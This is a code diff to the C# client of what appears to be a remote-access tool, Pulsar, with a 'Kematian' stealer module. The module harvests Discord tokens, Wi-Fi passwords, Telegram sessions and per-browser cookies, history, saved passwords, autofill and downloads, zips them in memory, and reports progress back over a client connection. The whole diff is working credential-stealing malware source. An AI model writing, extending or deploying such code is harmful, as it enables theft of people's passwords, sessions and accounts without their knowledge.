@@ -8,33 +8,47 @@ using System.Diagnostics;
 using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
-using System.Threading.Tasks;
+using Pulsar.Common.Networking;
+using Pulsar.Common.Messages;
 
 namespace Pulsar.Client.Kematian
 {
     public class Handler
     {
-        public static byte[] GetData()
+        public static byte[] GetData(ISender client = null)
         {
             byte[] data = null;
+            
+            if (client != null)
+                client.Send(new SetStatus { Message = "Kematian - Started retrieving" });
+            
             using (var memoryStream = new MemoryStream())
             {
                 using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                 {
+                    if (client != null)
+                        client.Send(new SetStatus { Message = "Kematian - 5%" });
+                    
                     var retriever = new BrowsersRetriever();
 
+                    if (client != null)
+                        client.Send(new SetStatus { Message = "Kematian - 15%" });
+                    
+                    var browsers = retriever.GetBrowserList();
+                    
+                    if (client != null)
+                        client.Send(new SetStatus { Message = "Kematian - 25%" });
+                    
                     var textMethods = new KeyValuePair<Func<string>, string>[]
                     {
                         new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
                         new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
                         new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
                     };
 
+                    if (client != null)
+                        client.Send(new SetStatus { Message = "Kematian - 30%" });
+                        
                     foreach (var methodPair in textMethods)
                     {
                         try
@@ -53,6 +67,128 @@ namespace Pulsar.Client.Kematian
                         }
                     }
 
+                    if (client != null)
+                        client.Send(new SetStatus { Message = "Kematian - 40%" });
+
+                    try
+                    {
+                        int browserCount = browsers.Count;
+                        int currentBrowser = 0;
+                        
+                        foreach (var browser in browsers)
+                        {
+                            currentBrowser++;
+                            int browserProgress = 40 + (currentBrowser * 40 / browserCount);
+                            if (client != null)
+                                client.Send(new SetStatus { Message = $"Kematian - {browserProgress}%" });
+                                
+                            string browserName = browser.Name;
+                            try
+                            {
+                                var content = retriever.GetCookiesForBrowser(browser);
+                                if (!string.IsNullOrEmpty(content))
+                                {
+                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\cookies_netscape.txt");
+                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                    using (var streamWriter = new StreamWriter(entryStream))
+                                    {
+                                        streamWriter.Write(content);
+                                    }
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error processing cookies for {browserName}: {ex.Message}");
+                            }
+
+                            try
+                            {
+                                var content = retriever.GetHistoryForBrowser(browser);
+                                if (!string.IsNullOrEmpty(content) && content != "[]")
+                                {
+                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\history.json");
+                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                    using (var streamWriter = new StreamWriter(entryStream))
+                                    {
+                                        streamWriter.Write(content);
+                                    }
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error processing history for {browserName}: {ex.Message}");
+                            }
+
+                            try
+                            {
+                                var content = retriever.GetPasswordsForBrowser(browser);
+                                if (!string.IsNullOrEmpty(content) && content != "[]")
+                                {
+                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\passwords.json");
+                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                    using (var streamWriter = new StreamWriter(entryStream))
+                                    {
+                                        streamWriter.Write(content);
+                                    }
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error processing passwords for {browserName}: {ex.Message}");
+                            }
+
+
+                            if (browser.IsChromium || browser.IsGecko)
+                            {
+                                try
+                                {
+                                    var content = retriever.GetAutoFillForBrowser(browser);
+                                    if (!string.IsNullOrEmpty(content) && content != "[]")
+                                    {
+                                        var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\autofill.json");
+                                        using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                        using (var streamWriter = new StreamWriter(entryStream))
+                                        {
+                                            streamWriter.Write(content);
+                                        }
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Debug.WriteLine($"Error processing autofill for {browserName}: {ex.Message}");
+                                }
+                            }
+
+                            if (browser.IsChromium || browser.IsGecko)
+                            {
+                                try
+                                {
+                                    var content = retriever.GetDownloadsForBrowser(browser);
+                                    if (!string.IsNullOrEmpty(content) && content != "[]")
+                                    {
+                                        var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\downloads.json");
+                                        using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                        using (var streamWriter = new StreamWriter(entryStream))
+                                        {
+                                            streamWriter.Write(content);
+                                        }
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Debug.WriteLine($"Error processing downloads for {browserName}: {ex.Message}");
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error processing browser data: {ex.Message}");
+                    }
+
+                    if (client != null)
+                        client.Send(new SetStatus { Message = "Kematian - 80%" });
+
                     try
                     {
                         var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
@@ -69,6 +205,9 @@ namespace Pulsar.Client.Kematian
                     {
                         Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
                     }
+
+                    if (client != null)
+                        client.Send(new SetStatus { Message = "Kematian - 90%" });
 
                     try
                     {
@@ -89,6 +228,10 @@ namespace Pulsar.Client.Kematian
                 }
                 data = memoryStream.ToArray();
             }
+            
+            if (client != null)
+                client.Send(new SetStatus { Message = "Kematian - Finished!" });
+                
             return data;
         }
     }
